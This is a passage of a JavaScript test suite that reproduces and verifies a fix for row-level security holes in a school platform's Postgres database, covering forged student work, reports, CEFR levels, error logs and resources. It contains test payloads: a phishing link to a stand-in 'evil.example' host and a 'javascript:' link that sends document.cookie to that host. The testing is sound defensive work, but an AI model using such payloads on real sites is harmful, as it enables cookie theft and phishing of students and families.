// F-21: who may write "approved work", reports, CEFR levels, error-log
// entries and resources - and what a link in them may be.
//
// Drives the REAL files against an in-process Postgres:
//   20261111110000  the real is_teacher_of_class,
//   docs/evidence/S1-F21-rollback.sql  = the creator-owned policies production
//                   had on 13 Nov 2026, verbatim: the "before", and the
//                   rollback under test at the end,
//   20261113140000  the fix, pasted twice.
// The other policies on these tables (admin, the child's and family's reads)
// are production's, copied from pg_policies.
import { PGlite } from "@electric-sql/pglite";
import { readFileSync } from "node:fs";
import { randomUUID } from "node:crypto";

const MIGS = process.argv.slice(2);
const TA_MIG = MIGS.find((f) => f.includes("20261111110000"));
const FIX_MIG = MIGS.find((f) => f.includes("creator_rows_need_class_staff"));
if (!TA_MIG || !FIX_MIG) {
  console.log("usage: creator-rows.test.mjs <20261111110000_...sql> <20261113140000_creator_rows_need_class_staff.sql>");
  console.log("0 passed, 1 failed");
  process.exit(1);
}
const LIVE = readFileSync(new URL("../../docs/evidence/S1-F21-rollback.sql", import.meta.url), "utf8");
let pass = 0, fail = 0;
const ok = (n, c, x = "") => { console.log(`  ${c ? "PASS" : "FAIL"}  ${n}${x ? " :: " + String(x).slice(0, 300) : ""}`); c ? pass++ : fail++; };
const eq = (n, got, want) => ok(n, JSON.stringify(got) === JSON.stringify(want),
  JSON.stringify(got) === JSON.stringify(want) ? "" : `got ${JSON.stringify(got)}, want ${JSON.stringify(want)}`);

const PRELUDE = `
  CREATE ROLE anon; CREATE ROLE authenticated; CREATE ROLE service_role BYPASSRLS;
  CREATE SCHEMA auth; CREATE TABLE auth.users (id uuid PRIMARY KEY);
  CREATE FUNCTION auth.uid() RETURNS uuid LANGUAGE sql STABLE AS
    $f$ SELECT NULLIF(current_setting('test.uid', true), '')::uuid $f$;
  GRANT USAGE ON SCHEMA auth TO anon, authenticated, service_role;
  CREATE TYPE public.app_role AS ENUM ('admin','teacher','family','student');
  CREATE TYPE public.session_status AS ENUM ('Scheduled','Held','Canceled');
  CREATE TABLE public.user_roles (user_id uuid NOT NULL, role public.app_role NOT NULL, UNIQUE (user_id, role));
  CREATE FUNCTION public.has_role(_user_id uuid, _role public.app_role) RETURNS boolean
    LANGUAGE sql STABLE SECURITY DEFINER SET search_path = public AS
    $f$ SELECT EXISTS (SELECT 1 FROM public.user_roles WHERE user_id = _user_id AND role = _role) $f$;
  CREATE TABLE public.teachers (id uuid PRIMARY KEY DEFAULT gen_random_uuid(), user_id uuid, is_active boolean NOT NULL DEFAULT true);
  CREATE TABLE public.teaching_assistants (id uuid PRIMARY KEY DEFAULT gen_random_uuid(), user_id uuid, is_active boolean DEFAULT true);
  CREATE TABLE public.classes (id uuid PRIMARY KEY DEFAULT gen_random_uuid(), name text, default_teacher_id uuid, schedule_template jsonb);
  CREATE TABLE public.sessions (id uuid PRIMARY KEY DEFAULT gen_random_uuid(), class_id uuid NOT NULL REFERENCES public.classes(id), teacher_id uuid,
    date date NOT NULL, start_time time NOT NULL DEFAULT '17:00', end_time time NOT NULL DEFAULT '18:00', status public.session_status NOT NULL DEFAULT 'Held');
  CREATE TABLE public.homeworks (id uuid PRIMARY KEY DEFAULT gen_random_uuid(), class_id uuid);
  CREATE TABLE public.session_participants (id uuid PRIMARY KEY DEFAULT gen_random_uuid(), session_id uuid NOT NULL REFERENCES public.sessions(id),
    participant_type text NOT NULL DEFAULT 'teaching_assistant', teaching_assistant_id uuid REFERENCES public.teaching_assistants(id),
    teacher_id uuid, created_by uuid, UNIQUE (session_id, teaching_assistant_id));
  CREATE TABLE public.families (id uuid PRIMARY KEY DEFAULT gen_random_uuid(), primary_user_id uuid);
  CREATE TABLE public.students (id uuid PRIMARY KEY DEFAULT gen_random_uuid(), full_name text, family_id uuid, linked_user_id uuid, secondary_user_id uuid);
  CREATE TABLE public.enrollments (id uuid PRIMARY KEY DEFAULT gen_random_uuid(), student_id uuid NOT NULL REFERENCES public.students(id),
    class_id uuid NOT NULL REFERENCES public.classes(id), start_date date NOT NULL DEFAULT '2026-01-01', end_date date);
  CREATE SCHEMA storage;
  CREATE TABLE storage.objects (id uuid PRIMARY KEY DEFAULT gen_random_uuid(), bucket_id text, name text);
  ALTER TABLE storage.objects ENABLE ROW LEVEL SECURITY;
  CREATE FUNCTION storage.foldername(n text) RETURNS text[] LANGUAGE sql AS
    $f$ SELECT (string_to_array(n,'/'))[1:array_length(string_to_array(n,'/'),1)-1] $f$;

  -- The five tables, with the columns production has (information_schema, 13 Nov 2026).
  CREATE TABLE public.student_work (id uuid PRIMARY KEY DEFAULT gen_random_uuid(), student_id uuid, class_id uuid, uploaded_by uuid NOT NULL,
    storage_path text, original_filename text, mime_type text, workflow text NOT NULL DEFAULT 'general', status text NOT NULL DEFAULT 'processing',
    teacher_notes text, approved_by uuid, approved_at timestamptz, created_at timestamptz NOT NULL DEFAULT now(), updated_at timestamptz NOT NULL DEFAULT now(),
    ai_feedback text, is_teamwork boolean NOT NULL DEFAULT false, member_student_ids uuid[] NOT NULL DEFAULT '{}', external_url text);
  CREATE TABLE public.student_reports (id uuid PRIMARY KEY DEFAULT gen_random_uuid(), student_id uuid NOT NULL, class_id uuid, generated_by uuid NOT NULL,
    period_start date, period_end date, status text NOT NULL DEFAULT 'generating', narrative text, published boolean NOT NULL DEFAULT false,
    created_at timestamptz NOT NULL DEFAULT now());
  CREATE TABLE public.cefr_assessments (id uuid PRIMARY KEY DEFAULT gen_random_uuid(), student_id uuid NOT NULL, class_id uuid, source text NOT NULL,
    level text NOT NULL, level_score numeric NOT NULL, evidence text, assessed_at date NOT NULL DEFAULT CURRENT_DATE, created_by uuid, source_id uuid,
    created_at timestamptz NOT NULL DEFAULT now());
  CREATE TABLE public.student_error_log (id uuid PRIMARY KEY DEFAULT gen_random_uuid(), student_id uuid NOT NULL, class_id uuid, source text NOT NULL,
    source_id uuid, error_text text NOT NULL, corrected_text text, error_type text NOT NULL DEFAULT 'grammar', severity smallint NOT NULL DEFAULT 1,
    resolved boolean NOT NULL DEFAULT false, created_by uuid, created_at timestamptz NOT NULL DEFAULT now());
  CREATE TABLE public.resources (id uuid PRIMARY KEY DEFAULT gen_random_uuid(), title text NOT NULL, storage_key text, external_url text, thumbnail_url text,
    visibility text NOT NULL DEFAULT 'private', uploaded_by uuid NOT NULL, created_at timestamptz NOT NULL DEFAULT now());
`;
const LIVE_REST = `
  CREATE FUNCTION public.can_view_student(student_id uuid, user_id uuid) RETURNS boolean LANGUAGE sql STABLE SECURITY DEFINER SET search_path TO 'public' AS $function$
    SELECT EXISTS (SELECT 1 FROM public.students s WHERE s.id = student_id AND (s.linked_user_id = user_id OR s.secondary_user_id = user_id
      OR EXISTS (SELECT 1 FROM public.families f WHERE f.id = s.family_id AND f.primary_user_id = user_id)));
  $function$;
  CREATE FUNCTION public.is_linked_student(_user_id uuid, _student_id uuid) RETURNS boolean LANGUAGE sql STABLE SECURITY DEFINER SET search_path TO 'public' AS $function$
    SELECT EXISTS (SELECT 1 FROM public.students s WHERE s.id = _student_id AND s.linked_user_id = _user_id);
  $function$;
  CREATE FUNCTION public.can_view_student_in_class(_student_id uuid, _user_id uuid) RETURNS boolean LANGUAGE sql STABLE SECURITY DEFINER SET search_path TO 'public' AS $function$
    SELECT EXISTS (SELECT 1 FROM public.enrollments e WHERE e.student_id = _student_id AND e.end_date IS NULL AND public.is_teacher_of_class(_user_id, e.class_id));
  $function$;
  ALTER TABLE public.student_work ENABLE ROW LEVEL SECURITY; ALTER TABLE public.student_reports ENABLE ROW LEVEL SECURITY;
  ALTER TABLE public.cefr_assessments ENABLE ROW LEVEL SECURITY; ALTER TABLE public.student_error_log ENABLE ROW LEVEL SECURITY;
  ALTER TABLE public.resources ENABLE ROW LEVEL SECURITY; ALTER TABLE public.students ENABLE ROW LEVEL SECURITY;
  GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO authenticated, service_role;
  GRANT EXECUTE ON ALL FUNCTIONS IN SCHEMA public TO authenticated, service_role;
  CREATE POLICY students_own ON public.students FOR SELECT TO authenticated
    USING (can_view_student(id, auth.uid()) OR can_view_student_in_class(id, auth.uid()) OR has_role(auth.uid(), 'admin'::app_role));

  CREATE POLICY admins_all_student_work ON public.student_work FOR ALL TO authenticated USING (has_role(auth.uid(), 'admin'::app_role)) WITH CHECK (has_role(auth.uid(), 'admin'::app_role));
  CREATE POLICY students_read_approved_work ON public.student_work FOR SELECT TO authenticated
    USING (((status = 'approved'::text) AND (EXISTS ( SELECT 1 FROM students s WHERE ((s.linked_user_id = auth.uid()) AND ((s.id = student_work.student_id) OR (s.id = ANY (student_work.member_student_ids))))))));
  CREATE POLICY admins_all_reports ON public.student_reports FOR ALL TO authenticated USING (has_role(auth.uid(), 'admin'::app_role)) WITH CHECK (has_role(auth.uid(), 'admin'::app_role));
  CREATE POLICY students_read_published_reports ON public.student_reports FOR SELECT TO authenticated USING ((published AND is_linked_student(auth.uid(), student_id)));
  CREATE POLICY admins_all_cefr ON public.cefr_assessments FOR ALL TO authenticated USING (has_role(auth.uid(), 'admin'::app_role)) WITH CHECK (has_role(auth.uid(), 'admin'::app_role));
  CREATE POLICY family_read_children_cefr ON public.cefr_assessments FOR SELECT TO authenticated USING (can_view_student(student_id, auth.uid()));
  CREATE POLICY students_read_own_cefr ON public.cefr_assessments FOR SELECT TO authenticated USING (is_linked_student(auth.uid(), student_id));
  CREATE POLICY admins_all_error_log ON public.student_error_log FOR ALL TO authenticated USING (has_role(auth.uid(), 'admin'::app_role)) WITH CHECK (has_role(auth.uid(), 'admin'::app_role));
  CREATE POLICY students_read_own_errors ON public.student_error_log FOR SELECT TO authenticated USING (is_linked_student(auth.uid(), student_id));
  CREATE POLICY "Admins can manage all resources" ON public.resources FOR ALL TO public
    USING ((EXISTS ( SELECT 1 FROM user_roles WHERE ((user_roles.user_id = auth.uid()) AND (user_roles.role = 'admin'::app_role)))));
  CREATE POLICY "Teachers and admins can view all resources" ON public.resources FOR SELECT TO public
    USING ((EXISTS ( SELECT 1 FROM user_roles WHERE ((user_roles.user_id = auth.uid()) AND (user_roles.role = ANY (ARRAY['admin'::app_role, 'teacher'::app_role]))))));
`;

const db = new PGlite();
const q = async (s, p) => (await db.query(s, p)).rows;
const one = async (s, p) => (await q(s, p))[0];
await db.exec(PRELUDE);
await db.exec(readFileSync(TA_MIG, "utf8"));
await db.exec(LIVE_REST);
let liveErr = null; try { await db.exec(LIVE); } catch (e) { liveErr = e.message; }
ok("production's creator-owned policies (the rollback file) install as the starting state", liveErr === null, liveErr ?? "");

// ---------------------------------------------------------------- people
const mk = async (role) => { const id = randomUUID(); await q(`INSERT INTO auth.users VALUES ($1)`, [id]); if (role) await q(`INSERT INTO public.user_roles VALUES ($1,$2)`, [id, role]); return id; };
const ADMIN = await mk("admin");
const TEA = await mk("teacher"), TEB = await mk("teacher"), TA_ON = await mk("teacher");
const PARENT = await mk("student");   // family 1's primary login; child A1 (class A)
const KID = await mk("student");      // A1's own login
const KIDB = await mk("student");     // B1's own login (class B)
const NEW = await mk("student");      // registered a minute ago, linked to nothing
const FAKE_T = await mk("teacher");   // role teacher, no teacher record (the pre-F-01 sign-up)
const NOROLE = await mk(null);
const GONE = await mk(null);          // made rows while staff; holds no role now (9 reports + 9 CEFR points in production are like this)
const tA = (await one(`INSERT INTO public.teachers (user_id) VALUES ($1) RETURNING id`, [TEA])).id;
const tB = (await one(`INSERT INTO public.teachers (user_id) VALUES ($1) RETURNING id`, [TEB])).id;
const taOn = (await one(`INSERT INTO public.teaching_assistants (user_id) VALUES ($1) RETURNING id`, [TA_ON])).id;
const CA = (await one(`INSERT INTO public.classes (name, default_teacher_id) VALUES ('A', $1) RETURNING id`, [tA])).id;
const CB = (await one(`INSERT INTO public.classes (name, default_teacher_id) VALUES ('B', $1) RETURNING id`, [tB])).id;
await q(`INSERT INTO public.class_teaching_assistants (class_id, teaching_assistant_id) VALUES ($1,$2)`, [CA, taOn]);
const F1 = (await one(`INSERT INTO public.families (primary_user_id) VALUES ($1) RETURNING id`, [PARENT])).id;
const kid = async (name, cls, { family = null, linked = null, end = null } = {}) => {
  const id = (await one(`INSERT INTO public.students (full_name, family_id, linked_user_id) VALUES ($1,$2,$3) RETURNING id`, [name, family, linked])).id;
  if (cls) await q(`INSERT INTO public.enrollments (student_id, class_id, end_date) VALUES ($1,$2,$3)`, [id, cls, end]);
  return id;
};
const A1 = await kid("A1", CA, { family: F1, linked: KID });
const A2 = await kid("A2", CA);
const AX = await kid("AX", CA, { end: "2026-06-30" });   // was in class A, left
const B1 = await kid("B1", CB, { linked: KIDB });
const NOCLASS = await kid("NC", null);

// Rows that exist before anyone attacks: service-role and staff writes.
const seed = {
  workA: (await one(`INSERT INTO public.student_work (student_id, class_id, uploaded_by, status, storage_path) VALUES ($1,$2,$3,'needs_review','incoming/a.jpg') RETURNING id`, [A1, CA, TEA])).id,
  workByTeb: (await one(`INSERT INTO public.student_work (student_id, class_id, uploaded_by, status, storage_path) VALUES ($1,$2,$3,'approved','incoming/b.jpg') RETURNING id`, [A1, CA, TEB])).id,
  workGone: (await one(`INSERT INTO public.student_work (student_id, class_id, uploaded_by, status) VALUES ($1,$2,$3,'approved') RETURNING id`, [A1, CA, GONE])).id,
  reportGone: (await one(`INSERT INTO public.student_reports (student_id, class_id, generated_by, status, published, narrative) VALUES ($1,$2,$3,'ready',true,'real report') RETURNING id`, [A1, CA, GONE])).id,
  cefrSvc: (await one(`INSERT INTO public.cefr_assessments (student_id, class_id, source, level, level_score) VALUES ($1,$2,'video','A2',2) RETURNING id`, [A1, CA])).id,
  errSvc: (await one(`INSERT INTO public.student_error_log (student_id, class_id, source, error_text) VALUES ($1,$2,'transcript','he go') RETURNING id`, [A1, CA])).id,
  resTea: (await one(`INSERT INTO public.resources (title, uploaded_by, external_url) VALUES ('Phonics', $1, 'https://example.org/phonics') RETURNING id`, [TEA])).id,
};

// keep = true commits.
async function as(uid, sql, params = [], { role = "authenticated", keep = false } = {}) {
  await db.exec("BEGIN");
  try {
    await db.query(`SELECT set_config('test.uid', $1, true)`, [uid ?? ""]);
    await db.exec(`SET LOCAL ROLE ${role}`);
    const r = await db.query(sql, params);
    await db.exec(keep ? "COMMIT" : "ROLLBACK");
    return { rows: r.rows, n: r.affectedRows ?? r.rows.length, err: null };
  } catch (e) { await db.exec("ROLLBACK"); return { rows: [], n: 0, err: e.message }; }
}
const allowed = (r) => r.err === null && r.n >= 1;
// The five forgeries, each naming the caller as creator, about child `sid` in class `cid`.
const FORGE = {
  student_work: (uid, sid, cid) => [`INSERT INTO public.student_work (uploaded_by, student_id, class_id, status, teacher_notes, external_url, original_filename)
     VALUES ($1,$2,$3,'approved','Well done! - your teacher','https://evil.example/login','Your certificate')`, [uid, sid, cid]],
  student_reports: (uid, sid, cid) => [`INSERT INTO public.student_reports (generated_by, student_id, class_id, status, published, narrative)
     VALUES ($1,$2,$3,'ready',true,'forged report')`, [uid, sid, cid]],
  cefr_assessments: (uid, sid, cid) => [`INSERT INTO public.cefr_assessments (created_by, student_id, class_id, source, level, level_score)
     VALUES ($1,$2,$3,'teacher','C2',6)`, [uid, sid, cid]],
  student_error_log: (uid, sid, cid) => [`INSERT INTO public.student_error_log (created_by, student_id, class_id, source, error_text)
     VALUES ($1,$2,$3,'live_flag','forged entry')`, [uid, sid, cid]],
  resources: (uid) => [`INSERT INTO public.resources (uploaded_by, title, external_url, visibility) VALUES ($1,'Free gift','https://evil.example/x','shared')`, [uid]],
};
const forgeAll = async (uid, sid, cid, role) => {
  const out = [];
  for (const [t, f] of Object.entries(FORGE)) { const [sql, p] = f(uid, sid, cid); if (allowed(await as(uid, sql, p, { role }))) out.push(t); }
  return out;
};
const FIVE = Object.keys(FORGE);

// ---------------------------------------------------------------- BEFORE
console.log("=== before the fix: the defect reproduces ===");
for (const [label, who] of [["a parent, about another family's child", PARENT], ["a child's own login, about another child", KID],
  ["an account registered a minute ago", NEW], ["an account with no role at all", NOROLE], ["a self-made teacher with no teacher record", FAKE_T]]) {
  eq(`${label}: can plant approved work, a published report, a CEFR level, an error-log entry and a shared resource`, await forgeAll(who, B1, CB), FIVE);
}
eq("  ...with no class at all (class_id NULL)", await forgeAll(NEW, B1, null), FIVE);
{
  // What the targeted child then sees.
  await db.exec("BEGIN");
  await db.query(`SELECT set_config('test.uid', $1, true)`, [NEW]);
  await db.exec(`SET LOCAL ROLE authenticated`);
  for (const f of ["student_work", "student_reports", "cefr_assessments", "student_error_log"]) { const [sql, p] = FORGE[f](NEW, B1, CB); await db.query(sql, p); }
  await db.query(`SELECT set_config('test.uid', $1, true)`, [KIDB]);
  const seen = (await db.query(`SELECT
    (SELECT string_agg(teacher_notes || ' -> ' || external_url, ';') FROM public.student_work WHERE student_id = $1) work,
    (SELECT string_agg(narrative, ';') FROM public.student_reports WHERE student_id = $1) report,
    (SELECT string_agg(level, ';') FROM public.cefr_assessments WHERE student_id = $1) cefr,
    (SELECT string_agg(error_text, ';') FROM public.student_error_log WHERE student_id = $1) errors`, [B1])).rows[0];
  await db.exec("ROLLBACK");
  eq("  ...and child B1's own login reads all four as the school's records", seen,
    { work: "Well done! - your teacher -> https://evil.example/login", report: "forged report", cefr: "C2", errors: "forged entry" });
}
{
  const js = await as(NEW, `INSERT INTO public.student_work (uploaded_by, student_id, class_id, status, external_url) VALUES ($1,$2,$3,'approved',$4)`, [NEW, B1, CB, "javascript:fetch('//evil.example/'+document.cookie)"]);
  ok("a javascript: link is accepted in student_work.external_url", allowed(js), js.err ?? "");
  const upd = await as(NEW, `UPDATE public.resources SET uploaded_by = $2 WHERE uploaded_by = $1`, [NEW, TEA]);
  ok("control: nothing to update for an account with no rows", upd.err === null && upd.n === 0, upd.err ?? "");
}
const visible = async (who) => {
  const out = {};
  for (const t of ["student_work", "student_reports", "cefr_assessments", "student_error_log", "resources"]) out[t] = (await as(who, `SELECT id::text FROM public.${t} ORDER BY 1`)).rows.map((r) => r.id);
  return out;
};
const PEOPLE = { ADMIN, TEA, TEB, TA_ON, PARENT, KID, KIDB, NEW, FAKE_T, NOROLE, GONE };
const visibleAll = async () => { const o = {}; for (const [k, v] of Object.entries(PEOPLE)) o[k] = await visible(v); return o; };
const BEFORE = await visibleAll();

// ---------------------------------------------------------------- APPLY
const fixText = readFileSync(FIX_MIG, "utf8");
const pols = async () => q(`SELECT tablename, policyname, cmd, roles::text, qual, with_check FROM pg_policies
  WHERE schemaname = 'public' AND tablename IN ('student_work','student_reports','cefr_assessments','student_error_log','resources') ORDER BY 1, 2`);
const cons = async () => q(`SELECT conrelid::regclass::text t, conname, convalidated v, pg_get_constraintdef(oid) d FROM pg_constraint WHERE conname LIKE '%_url_http' ORDER BY 1, 2`);
const counts = async () => one(`SELECT (SELECT count(*) FROM public.student_work)::int w, (SELECT count(*) FROM public.student_reports)::int r,
  (SELECT count(*) FROM public.cefr_assessments)::int c, (SELECT count(*) FROM public.student_error_log)::int e, (SELECT count(*) FROM public.resources)::int s`);
const P0 = await pols(), N0 = await counts();
// A link that is not http(s), planted before the fix.
const badLink = (await one(`INSERT INTO public.student_work (uploaded_by, student_id, class_id, status, external_url) VALUES ($1,$2,$3,'approved','javascript:alert(1)') RETURNING id`, [TEA, A1, CA])).id;
let e1 = null; try { await db.exec(fixText); } catch (e) { e1 = e.message; }
ok("the fix applies (with a bad link already in the table: NOT VALID)", e1 === null, e1 ?? "");
const P1 = await pols(), K1 = await cons();
let e2 = null; try { await db.exec(fixText); } catch (e) { e2 = e.message; }
ok("and applies a second time", e2 === null, e2 ?? "");
eq("the second paste leaves the same policies and constraints, byte for byte", [await pols(), await cons()], [P1, K1]);
{
  const names = (ps) => ps.map((p) => `${p.tablename}/${p.policyname}/${p.cmd}`);
  eq("the seven creator-owned policies are gone", names(P0).filter((n) => !names(P1).includes(n)),
    ["cefr_assessments/teachers_manage_class_cefr/ALL", "resources/Teachers can delete own resources/DELETE", "resources/Teachers can insert own resources/INSERT",
     "resources/Teachers can update own resources/UPDATE", "student_error_log/teachers_manage_class_error_log/ALL", "student_reports/teachers_manage_reports/ALL",
     "student_work/teachers_manage_class_student_work/ALL"]);
  eq("nineteen take their place: select / insert / update / delete on four tables, insert / update / delete on resources", names(P1).filter((n) => !names(P0).includes(n)).length, 19);
  const keep = (ps) => ps.filter((p) => names(P0).includes(`${p.tablename}/${p.policyname}/${p.cmd}`) && names(P1).includes(`${p.tablename}/${p.policyname}/${p.cmd}`));
  eq("the admin policies and the child's / family's read policies are byte-identical", keep(P1), keep(P0));
  ok("no non-admin write policy is left that trusts the creator column alone",
    !P1.some((p) => ["ALL", "INSERT", "UPDATE"].includes(p.cmd) && /(uploaded_by|generated_by|created_by) = auth\.uid\(\)/.test(`${p.qual} ${p.with_check}`)
      && !/staff_may_write_for|has_role/.test(`${p.qual} ${p.with_check}`)));
}
eq("three link constraints, NOT VALID", K1.map((k) => `${k.t}.${k.conname}:${k.v}`),
  ["resources.resources_external_url_http:false", "resources.resources_thumbnail_url_http:false", "student_work.student_work_external_url_http:false"]);
eq("no row was written or removed", await counts(), { ...N0, w: N0.w + 1 });
eq("the three helpers: STABLE, SECURITY DEFINER, search_path pinned, authenticated yes, anon no",
  await q(`SELECT p.proname n, p.provolatile v, p.prosecdef d, p.proconfig::text c, has_function_privilege('anon', p.oid, 'EXECUTE') a,
    has_function_privilege('authenticated', p.oid, 'EXECUTE') u FROM pg_proc p WHERE p.proname LIKE 'staff_%' ORDER BY 1`),
  ["staff_created_this", "staff_may_write_for", "staff_may_write_for_members"].map((n) => ({ n, v: "s", d: true, c: "{search_path=public}", a: false, u: true })));

// ---------------------------------------------------------------- AFTER
console.log("=== after: the forgeries ===");
for (const [label, who, role] of [["a parent", PARENT], ["a child's own login", KID], ["an account registered a minute ago", NEW], ["an account with no role", NOROLE],
  ["a self-made teacher with no teacher record", FAKE_T], ["an account that used to be staff and holds no role now", GONE], ["the signed-in role with no uid", null]]) {
  // resources are not about a child and go by role: an account holding the
  // teacher role may add its own (asserted under "resources" below).
  const own = who === FAKE_T ? ["resources"] : [];
  eq(`${label}: none of the four records about another child${own.length ? " (a resource of its own: yes, it holds the teacher role)" : ", no resource"}`, await forgeAll(who, B1, CB, role), own);
  eq(`  ...nor with no class`, await forgeAll(who, B1, null, role), own);
}
eq("a parent cannot write them about their OWN child either (nothing here is self-service)", await forgeAll(PARENT, A1, CA), []);
eq("a child's login cannot write its own work, report, level or error log", await forgeAll(KID, A1, CA), []);
eq("teacher B (class B) cannot write about class A's child in class A", (await forgeAll(TEB, A1, CA)).filter((t) => t !== "resources"), []);
eq("teacher A cannot file class-A rows about a child who is in class B only", (await forgeAll(TEA, B1, CA)).filter((t) => t !== "resources"), []);
eq("  ...nor about a child enrolled nowhere", (await forgeAll(TEA, NOCLASS, CA)).filter((t) => t !== "resources"), []);
eq("  ...nor with no class", (await forgeAll(TEA, A1, null)).filter((t) => t !== "resources"), []);
{
  const other = [];
  for (const t of ["student_work", "student_reports", "cefr_assessments", "student_error_log"]) {
    const [sql] = FORGE[t](TEB, A1, CA);
    if (allowed(await as(TEA, sql, [TEB, A1, CA]))) other.push(t);     // teacher A writes, naming teacher B as the creator
  }
  eq("teacher A cannot sign a row with another person's id", other, []);
  const anon = await as(null, ...FORGE.student_work(null, B1, CB), { role: "anon" });
  ok("anon: nothing", anon.err !== null, "allowed");
}

console.log("=== after: what staff really do, statement by statement ===");
for (const [label, who] of [["teacher A", TEA], ["a TA on class A", TA_ON]]) {
  // TeacherSmartUpload.tsx:330-343 (photo, no student yet), :438-451 (team work), :477-487 (link), :531-542 (approve).
  const up = await as(who, `INSERT INTO public.student_work (uploaded_by, class_id, student_id, storage_path, original_filename, mime_type, workflow, status)
    VALUES ($1,$2,NULL,'incoming/x.jpg','x.jpg','image/jpeg','general','processing') RETURNING id`, [who, CA], { keep: true });
  ok(`${label}: uploads a photo for the class (no student yet) and gets its id back`, allowed(up), up.err ?? "");
  const team = await as(who, `INSERT INTO public.student_work (uploaded_by, class_id, student_id, member_student_ids, is_teamwork, workflow, storage_path, status)
    VALUES ($1,$2,$3,$4::uuid[],true,'teamwork','teams/x.jpg','needs_review')`, [who, CA, A1, [A1, A2]]);
  ok(`${label}: files team work for two children of the class`, allowed(team), team.err ?? "");
  const link = await as(who, `INSERT INTO public.student_work (uploaded_by, class_id, student_id, member_student_ids, is_teamwork, workflow, external_url, original_filename, status)
    VALUES ($1,$2,$3,'{}',false,'general','https://docs.example.com/d/abc?usp=sharing','Essay','needs_review')`, [who, CA, A1]);
  ok(`${label}: adds an https link as work`, allowed(link), link.err ?? "");
  const approve = await as(who, `UPDATE public.student_work SET status = 'approved', student_id = $2, teacher_notes = 'Lovely work', approved_by = $3, approved_at = now(), updated_at = now() WHERE id = $1`,
    [up.rows[0]?.id, A1, who], { keep: true });
  ok(`${label}: approves it, assigning the child`, allowed(approve), approve.err ?? "");
  // BulkReportExport.tsx:164-176 from the class page, then AIReportDialog.tsx:97-100 (publish).
  const rep = await as(who, `INSERT INTO public.student_reports (student_id, class_id, generated_by, period_start, period_end, status)
    VALUES ($1,$2,$3,'2026-08-01','2026-11-01','generating') RETURNING id`, [A1, CA, who], { keep: true });
  ok(`${label}: starts a report for a child of the class`, allowed(rep), rep.err ?? "");
  ok(`${label}: publishes it`, allowed(await as(who, `UPDATE public.student_reports SET published = true WHERE id = $1`, [rep.rows[0]?.id], { keep: true })));
  // TeacherTranscripts.tsx:588-601 and :619-629; StudentActionPopover.tsx:196-207.
  const err = await as(who, `INSERT INTO public.student_error_log (student_id, class_id, source, source_id, error_text, corrected_text, error_type, created_by)
    VALUES ($1,$2,'transcript',$3,'he go','he goes','grammar',$4) RETURNING id`, [A1, CA, randomUUID(), who]);
  ok(`${label}: backfills an error-log entry from a transcript`, allowed(err), err.err ?? "");
  const flag = await as(who, `INSERT INTO public.student_error_log (student_id, class_id, source, error_text, error_type, created_by) VALUES ($1,$2,'live_flag','she dont','grammar',$3) RETURNING id`, [A2, CA, who]);
  ok(`${label}: flags an error live in class`, allowed(flag), flag.err ?? "");
  const cefr = await as(who, `INSERT INTO public.cefr_assessments (student_id, class_id, source, level, level_score, evidence, assessed_at, source_id, created_by)
    VALUES ($1,$2,'transcript','A2',2,'evidence','2026-11-03',$3,$4)`, [A1, CA, randomUUID(), who]);
  ok(`${label}: records a CEFR point from a transcript`, allowed(cefr), cefr.err ?? "");
}
{
  ok("teacher A files work for a child who was in the class and has left", allowed(await as(TEA, `INSERT INTO public.student_work (uploaded_by, class_id, student_id, status) VALUES ($1,$2,$3,'needs_review')`, [TEA, CA, AX])));
  ok("teacher A edits rows of the class that the service role created (created_by NULL)", allowed(await as(TEA, `UPDATE public.student_error_log SET resolved = true WHERE id = $1`, [seed.errSvc]))
    && allowed(await as(TEA, `UPDATE public.cefr_assessments SET evidence = 'checked' WHERE id = $1`, [seed.cefrSvc])));
  ok("teacher A rejects and deletes class A's work", allowed(await as(TEA, `UPDATE public.student_work SET status = 'rejected' WHERE id = $1`, [seed.workA])) && allowed(await as(TEA, `DELETE FROM public.student_work WHERE id = $1`, [seed.workA])));
  // An admin, from a student's page: AIReportDialog with no class.
  const adm = await as(ADMIN, `INSERT INTO public.student_reports (student_id, class_id, generated_by, status) VALUES ($1,NULL,$2,'generating') RETURNING id`, [B1, ADMIN]);
  ok("an admin starts a report with no class (the student page)", allowed(adm), adm.err ?? "");
  eq("an admin can still write all five, for anyone", await forgeAll(ADMIN, B1, null), FIVE);
  // Edge functions and approve_video_feedback: the service role.
  const svc = await as(null, `WITH a AS (UPDATE public.student_work SET ai_feedback = 'draft' WHERE id = $1 RETURNING 1),
    b AS (INSERT INTO public.cefr_assessments (student_id, class_id, source, level, level_score) VALUES ($2,$3,'video','B1',3) RETURNING 1),
    c AS (INSERT INTO public.student_error_log (student_id, class_id, source, error_text) VALUES ($2,$3,'video','x') RETURNING 1)
    SELECT (SELECT count(*) FROM a)::int + (SELECT count(*) FROM b)::int + (SELECT count(*) FROM c)::int n`, [seed.workByTeb, A1, CA], { role: "service_role" });
  eq("the service role (edge functions, approve_video_feedback) writes as before", svc.rows[0]?.n, 3);
}

console.log("=== after: updates, moves and old rows ===");
{
  ok("teacher B made a class-A row once: still reads it (creator, holds teacher)", (await as(TEB, `SELECT 1 FROM public.student_work WHERE id = $1`, [seed.workByTeb])).rows.length === 1);
  const u = await as(TEB, `UPDATE public.student_work SET teacher_notes = 'changed' WHERE id = $1`, [seed.workByTeb]);
  const d = await as(TEB, `DELETE FROM public.student_work WHERE id = $1`, [seed.workByTeb]);
  eq("  ...but being its creator no longer lets teacher B change or delete it", [u.n, d.n], [0, 0]);
  ok("  ...teacher A (the class's staff) can", allowed(await as(TEA, `UPDATE public.student_work SET teacher_notes = 'ok' WHERE id = $1`, [seed.workByTeb])));
  eq("an account that made rows and holds no role now reads none of them, and can change none",
    [(await visible(GONE)).student_work, (await visible(GONE)).student_reports, (await as(GONE, `UPDATE public.student_reports SET published = false WHERE id = $1`, [seed.reportGone])).n], [[], [], 0]);
  ok("  ...the report itself is untouched and the child still reads it", (await as(KID, `SELECT narrative FROM public.student_reports WHERE id = $1`, [seed.reportGone])).rows[0]?.narrative === "real report");
  const mv = await as(TEA, `UPDATE public.student_work SET class_id = $2 WHERE id = $1`, [seed.workByTeb, CB]);
  ok("teacher A cannot move a class-A row into class B", mv.err !== null, `allowed (${mv.n})`);
  const re = await as(TEA, `UPDATE public.student_work SET student_id = $2 WHERE id = $1`, [seed.workByTeb, B1]);
  ok("nor re-point it at a child of class B", re.err !== null, `allowed (${re.n})`);
